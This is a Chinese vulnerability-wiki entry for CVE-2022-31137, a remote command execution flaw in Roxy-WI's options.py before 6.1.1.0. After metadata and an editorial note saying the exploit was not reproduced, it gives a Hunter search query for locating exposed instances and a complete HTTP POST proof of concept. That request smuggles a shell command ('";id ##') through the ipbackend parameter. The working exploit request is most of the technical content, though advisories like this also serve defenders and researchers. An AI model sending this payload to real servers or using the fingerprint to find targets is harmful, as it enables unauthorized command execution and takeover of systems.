---
source: "wy876 漏洞文库"
title: "Roxy-WI options.py远程命令执行漏洞"
product: "Roxy-WI"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "active"
primary_identifiers: "CVE-2022-31137"
referenced_identifiers: ""
identifier_role: "primary"
cve: "CVE-2022-31137"
prerequisites: "<6.1.1.0;no auth shown"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-4a9f33967365b6ac2ee1c70b"
entity_id: "ve-4a9f33967365b6ac2ee1c70b"
schema_version: "1"
previous_fofa_unverified: "app.name="
hunter: "app.name=\"Roxy-WI\""
---

# Roxy-WI options.py远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：<6.1.1.0;no auth shown
- 证据范围：Same alert_consumer/ipbackend request as36

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- fofa metadata truncated Hunter app.name=
- CVE omitted; confirm association with36 against primary source
- HTTP block mislabeledJava; no response/fix reference

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

# 一、漏洞简介
`Roxy-WI`是开源的一款用于管理`Haproxy`、`Nginx`和`Keepalive`服务器的`Web`界面。`Roxy-WI 6.1.1.0`之前版本`options.py`接口存在远程命令执行漏洞，攻击者可以执行命令获取服务器权限。

# 二、影响版本
+ Roxy-WI 6.1.1.0之前

# 三、资产测绘
+ hunter`app.name="Roxy-WI"`
+ 登录页面


# 四、漏洞复现
```http
POST /app/options.py HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/117.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Te: trailers
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 82

alert_consumer=1&serv=127.0.0.1&ipbackend=%22%3Bid+%23%23&backend_server=127.0.0.1
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/rhpr1hfx80b04z1f>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
